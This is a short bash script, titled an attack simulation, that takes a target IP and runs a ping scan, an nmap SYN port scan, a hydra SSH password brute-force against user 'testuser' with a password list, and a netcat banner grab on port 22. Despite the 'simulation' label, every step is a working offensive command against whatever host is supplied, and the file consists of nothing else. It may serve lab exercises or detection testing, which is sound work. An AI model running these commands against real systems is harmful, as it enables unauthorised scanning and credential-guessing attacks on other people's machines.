#!/bin/bash

TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: ./attack_simulation.sh <target-ip>"
  exit 1
fi

echo "=== Starting Attack Simulation ==="

echo "[1] ICMP scan..."
ping -c 4 $TARGET

echo "[2] Port scan..."
nmap -sS -Pn $TARGET

echo "[3] SSH brute-force attempt..."
hydra -l testuser -P password.txt ssh://$TARGET -t 4 -f

echo "[4] Banner grab..."
nc $TARGET 22

echo "=== Simulation Complete ==="
